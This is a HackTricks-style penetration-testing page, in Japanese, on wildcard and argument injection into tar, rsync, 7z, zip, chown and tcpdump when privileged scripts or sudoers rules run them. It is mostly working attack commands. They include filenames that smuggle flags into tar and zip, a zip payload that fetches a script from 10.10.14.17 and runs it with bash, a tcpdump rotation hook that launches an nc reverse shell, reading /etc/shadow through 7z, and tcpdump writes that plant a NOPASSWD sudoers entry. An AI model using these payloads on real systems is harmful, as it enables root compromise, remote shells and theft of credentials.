# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** は、特権スクリプトが `tar`, `chown`, `rsync`, `zip`, `7z`, … のような Unix binary を、`*` のようなクォートされていない wildcard 付きで実行したときに起こります。
> shell は binary を実行する**前**に wildcard を展開するため、working directory にファイルを作成できる attacker は、`-` で始まる filename を仕込めます。これらは **data ではなく options** として解釈されるため、任意の flags さらには commands まで事実上 smuggle できます。
> この page では、2023-2025 における最も有用な primitives、recent research、modern detections をまとめます。

## chown / chmod

`--reference` flag を悪用することで、**任意の file の owner/group または permission bits を copy できます**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root が後で次のようなものを実行するとき:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` が注入されると、*すべて* の一致するファイルが `/root/secret``file` の所有権/権限を継承します。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
詳細は classic DefenseCode paper も参照してください。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 機能を悪用して任意のコマンドを実行します:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
例えば root が `tar -czf /root/backup.tgz *` を実行すると、`shell.sh` は root として実行されます。

### bsdtar / macOS 14+

最近の macOS のデフォルトの `tar`（`libarchive` ベース）は `--checkpoint` を実装していませんが、外部 compressor を指定できる **--use-compress-program** フラグを使えば、それでも code-execution を実現できます。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、`/bin/sh` が起動されます。

---

## rsync

`rsync` は、`-e` または `--rsync-path` で始まるコマンドラインフラグを使って、リモートシェルやリモートバイナリさえも上書きできます：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root が後で `rsync -az * backup:/srv/` でディレクトリをアーカイブすると、注入した flag によりリモート側で shell が起動する。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

特権スクリプトが *防御的に* wildcard の前に `--` を付けていても（option parsing を止めるため）、7-Zip フォーマットは filename の前に `@` を付けることで **file list files** をサポートしている。これを symlink と組み合わせると、*任意の files を exfiltrate* できる：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
もし root が次のようなものを実行した場合:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip は `root.txt`（→ `/etc/shadow`）をファイルリストとして読み込もうとして失敗し、**内容を stderr に出力**します。

これは `-- *` でも成立します。というのも 7-Zip の CLI は、通常のファイル名と `@listfiles` の両方を positional input として明示的に受け付けるため、`@root.txt` のようなリテラルなファイル名であっても特別に扱われるからです。

---

## zip

アプリケーションがユーザー制御のファイル名を `zip` に渡す場合（wildcard 経由、または `--` なしで名前を列挙する場合）の、非常に実用的な primitive が 2 つあります。

- test hook による RCE: `-T` は “test archive” を有効にし、`-TT <cmd>` は tester を任意のプログラムに置き換えます（long form: `--unzip-command <cmd>`）。`-` で始まるファイル名を注入できるなら、short-options parsing が機能するように、フラグを別々のファイル名に分割します:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- `'-T -TT <cmd>'` のような単一の filename を試さないでください。短い options は文字ごとに解析されるため、失敗します。示されているように separate tokens を使ってください。
- app によって filenames から slashes が削除される場合は、bare host/IP から取得し（default path `/index.html`）、`-O` で local に保存してから execute してください。
- トークンがどのように消費されるかを理解するために、`-sc`（processed argv を表示）または `-h2`（more help）で parsing を debug できます。

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: もし web 層が `zip` の stdout/stderr をそのまま返すなら（素朴な wrapper でよくある）、注入された `--help` のようなフラグや、不正なオプションによる失敗が HTTP レスポンスに現れ、コマンドライン injection の確認と payload 調整に役立つ。

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

以下のコマンドは、最近の CTF や実環境で悪用されてきました。payload は常に、後で wildcard で処理される writable directory 内の *filename* として作成されます。

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

これらの primitive は *tar/rsync/zip* の定番ほど一般的ではありませんが、調査時には確認する価値があります。

---

## Hunting vulnerable wrappers and jobs

最近の case study では、wildcard/argv injection はもはや **cron + tar** だけの問題ではないことが示されています。同じ bug class は次のような場所でも繰り返し現れます:

- attacker-controlled upload directories から「全部 zip/tar でダウンロード」する web 機能
- attacker-controlled filename/filter fields を持つ **tcpdump** wrapper を公開している vendor/appliance debug shell
- writable directories に対して `tar`, `rsync`, `7z`, `zip`, `chown`, `chmod` を呼び出す backup や rotation ジョブ

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *` は多くの GNU tools では有効な修正だが、`7z`/`7za` では **使えない**。`@listfiles` は別にパースされるため。
- `zip` では、ユーザー制御可能なファイル名をそのまま列挙する wrapper を探すこと。短いオプションの分割（`-T` + `-TT <cmd>`）は、shell glob がなくてもまだ動く。
- `tcpdump` では、**output file names**、**rotation settings**、または **capture-file replay** 引数を制御できる wrapper に特に注意すること。

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

制限付き shell や vendor wrapper が、厳密な引用/検証なしにユーザー制御フィールド（例: "file name" パラメータ）を連結して `tcpdump` の command line を組み立てる場合、追加の `tcpdump` flags を紛れ込ませることができる。`-G`（時間ベースの rotation）、`-W`（ファイル数の制限）、`-z <cmd>`（post-rotate command）の組み合わせにより、tcpdump を実行しているユーザーとして任意の command execution が可能になる（多くの場合、appliances 上では root）。

前提条件:

- `tcpdump` に渡される `argv` を影響できること（例: `/debug/tcpdump --filter=... --file-name=<HERE>` のような wrapper 経由）。
- wrapper が file name フィールド内の空白や `-` で始まる token をサニタイズしていないこと。

Classic PoC（書き込み可能な path から reverse shell script を実行する）:
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` は、最初に一致したパケットの後に即座に rotate させます。
- `-z <cmd>` は、各 rotate ごとに post-rotate command を1回実行します。多くのビルドでは `<cmd> <savefile>` が実行されます。`<cmd>` が script/interpreter の場合、引数の扱いが payload と一致することを確認してください。

No-removable-media variants:

- 他に file を書き込む primitive がある場合（例: output redirection を許可する separate command wrapper）、script を既知の path に置き、`-z /bin/sh /path/script.sh` またはプラットフォームの semantics に応じて `-z /path/script.sh` を trigger します。
- 一部の vendor wrappers は、attacker-controllable な location に rotate します。rotated path を制御できるなら（symlink/directory traversal）、外部 media なしで完全に control した content を実行するように `-z` を steer できます。

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob と許容的なパターンは、最初の `-w` 引数しか制約しない。`tcpdump` は複数の `-w` オプションを受け付け、最後のものが優先される。
- ルールは他のオプションを固定していないため、`-Z`、`-r`、`-V` などが許可される。

Primitives
- 2つ目の `-w` で保存先パスを上書きする（最初のものは sudoers を満たすだけ）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 最初の `-w` 内で path traversal して制約された tree から抜ける:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` で出力所有権を強制する（任意の場所に root 所有のファイルを作成する）:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` を使って crafted PCAP を replay することで Arbitrary-content を書き込み可能（例: sudoers の行を drop する）:

<details>
<summary>exact ASCII payload を含む PCAP を作成し、root としてそれを書き込む</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` による任意ファイル読み取り/secret leak（savefiles のリストを解釈する）。エラー診断では行がそのまま表示されることが多く、内容が漏れる:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
